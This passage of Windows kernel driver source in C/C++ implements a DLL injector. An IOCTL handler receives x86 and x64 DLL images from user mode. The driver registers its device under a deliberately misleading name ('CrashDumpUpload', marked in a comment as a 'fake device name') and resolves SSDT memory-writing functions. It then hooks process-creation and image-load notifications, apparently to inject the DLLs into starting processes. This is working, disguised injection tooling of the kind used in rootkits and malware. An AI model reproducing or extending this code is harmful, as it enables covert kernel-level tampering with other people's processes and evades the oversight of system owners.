	inBuf = (PUCHAR)Irp->AssociatedIrp.SystemBuffer;
	outBuf = (PUCHAR)Irp->AssociatedIrp.SystemBuffer;

	if (!inBufLength || !outBufLength)
	{
		ntStatus = STATUS_INVALID_PARAMETER;
		goto End;
	}

	switch (irpSp->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_SET_INJECT_X86DLL:
	{
		if (g_injectDll.x86dll == NULL && g_injectDll.x86dllsize == 0)
		{
			PIMAGE_DOS_HEADER dosHeadPtr = (PIMAGE_DOS_HEADER)inBuf;
			if (dosHeadPtr->e_magic != IMAGE_DOS_SIGNATURE)
			{
				break;
			}

			g_injectDll.x86dll = ExAllocatePoolWithTag(NonPagedPool, inBufLength, 'd68x');
			if (g_injectDll.x86dll != NULL)
			{
				g_injectDll.x86dllsize = inBufLength;
				memcpy(g_injectDll.x86dll, inBuf, inBufLength);
				ntStatus = STATUS_SUCCESS;
			}
		}
		break;
	}
	case IOCTL_SET_INJECT_X64DLL:
	{
		if (g_injectDll.x64dll == NULL && g_injectDll.x64dllsize == 0)
		{
			PIMAGE_DOS_HEADER dosHeadPtr = (PIMAGE_DOS_HEADER)inBuf;
			if (dosHeadPtr->e_magic != IMAGE_DOS_SIGNATURE)
			{
				break;
			}

			g_injectDll.x64dll = ExAllocatePoolWithTag(NonPagedPool, inBufLength, 'd64x');
			if (g_injectDll.x64dll != NULL)
			{
				g_injectDll.x64dllsize = inBufLength;
				memcpy(g_injectDll.x64dll, inBuf, inBufLength);
				ntStatus = STATUS_SUCCESS;
			}
		}
		break;
	}

	default:
		break;
	}

End:
	//
	// Finish the I/O operation by simply completing the packet and returning
	// the same status as in the packet itself.
	//

	Irp->IoStatus.Status = ntStatus;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return ntStatus;
}

extern "C"
NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING  RegistryPath)
{
 
	UNREFERENCED_PARAMETER(RegistryPath);
	PDEVICE_OBJECT DeviceObject = NULL;
	NTSTATUS status;

	//set callback functions
	DriverObject->DriverUnload = DriverUnload;
	for (unsigned int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
		DriverObject->MajorFunction[i] = DriverDefaultHandler;

	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverControlHandler;

	//read ntdll.dll from disk so we can use it for exports
	if (!NT_SUCCESS(NTDLL::Initialize()))
	{
		DPRINT("[DeugMessage] Ntdll::Initialize() failed...\r\n");
		return STATUS_UNSUCCESSFUL;
	}

	//initialize undocumented APIs
	if (!Undocumented::UndocumentedInit())
	{
		DPRINT("[DeugMessage] UndocumentedInit() failed...\r\n");
		return STATUS_UNSUCCESSFUL;
	}
	DPRINT("[DeugMessage] UndocumentedInit() was successful!\r\n");

	//create io device ,use fake device name
	RtlInitUnicodeString(&DeviceName, L"\\Device\\CrashDumpUpload");
	RtlInitUnicodeString(&Win32Device, L"\\DosDevices\\CrashDumpUpload");
	status = IoCreateDevice(DriverObject,
		0,
		&DeviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject);
	if (!NT_SUCCESS(status))
	{
		NTDLL::Deinitialize();
		DPRINT("[DeugMessage] IoCreateDevice Error...\r\n");
		return status;
	}
	if (!DeviceObject)
	{
		NTDLL::Deinitialize();
		DPRINT("[DeugMessage] Unexpected I/O Error...\r\n");
		return STATUS_UNEXPECTED_IO_ERROR;
	}
	DPRINT("[DeugMessage] Device %.*ws created successfully!\r\n", DeviceName.Length / sizeof(WCHAR), DeviceName.Buffer);

	//create symbolic link
	DeviceObject->Flags |= DO_BUFFERED_IO;
	DeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);
	status = IoCreateSymbolicLink(&Win32Device, &DeviceName);
	if (!NT_SUCCESS(status))
	{
		NTDLL::Deinitialize();
		IoDeleteDevice(DriverObject->DeviceObject);
		DPRINT("[DeugMessage] IoCreateSymbolicLink Error...\r\n");
		return status;
	}
	DPRINT("[DeugMessage] Symbolic link %.*ws->%.*ws created!\r\n", Win32Device.Length / sizeof(WCHAR), Win32Device.Buffer, DeviceName.Length / sizeof(WCHAR), DeviceName.Buffer);


	//KdBreakPoint();

	InitializeListHead((PLIST_ENTRY)&g_injectList);
	ExInitializeResourceLite(&g_ResourceMutex);
	ExInitializeNPagedLookasideList(&g_injectListLookaside, NULL, NULL, NULL, sizeof(INJECT_PROCESSID_LIST), TAG_INJECTLIST, NULL);
	ExInitializeNPagedLookasideList(&g_injectDataLookaside, NULL, NULL, NULL, sizeof(INJECT_PROCESSID_DATA), TAG_INJECTDATA, NULL);

	memset(&g_injectDll, 0, sizeof(INJECT_PROCESSID_DLL));

	pfn_NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)SSDT::GetFunctionAddress("NtAllocateVirtualMemory");
	pfn_NtReadVirtualMemory = (fn_NtReadVirtualMemory)SSDT::GetFunctionAddress("NtReadVirtualMemory");
	pfn_NtWriteVirtualMemory = (fn_NtWriteVirtualMemory)SSDT::GetFunctionAddress("NtWriteVirtualMemory");
	pfn_NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)SSDT::GetFunctionAddress("NtProtectVirtualMemory");
	if (pfn_NtAllocateVirtualMemory == NULL ||
		pfn_NtReadVirtualMemory == NULL ||
		pfn_NtWriteVirtualMemory == NULL ||
		pfn_NtProtectVirtualMemory == NULL)
	{
		NTDLL::Deinitialize();
		IoDeleteSymbolicLink(&Win32Device);
		IoDeleteDevice(DriverObject->DeviceObject);
		return STATUS_UNSUCCESSFUL;
	}

	status = PsSetLoadImageNotifyRoutine(LoadImageNotify);
	if (!NT_SUCCESS(status))
	{
		NTDLL::Deinitialize();
		IoDeleteSymbolicLink(&Win32Device);
		IoDeleteDevice(DriverObject->DeviceObject);
		return status;
	}

	status = PsSetCreateProcessNotifyRoutine(CreateProcessNotify, FALSE);
	if (!NT_SUCCESS(status))
	{
		PsRemoveLoadImageNotifyRoutine(LoadImageNotify);
		NTDLL::Deinitialize();
		IoDeleteSymbolicLink(&Win32Device);
		IoDeleteDevice(DriverObject->DeviceObject);
		return status;
	}

	return STATUS_SUCCESS;

}
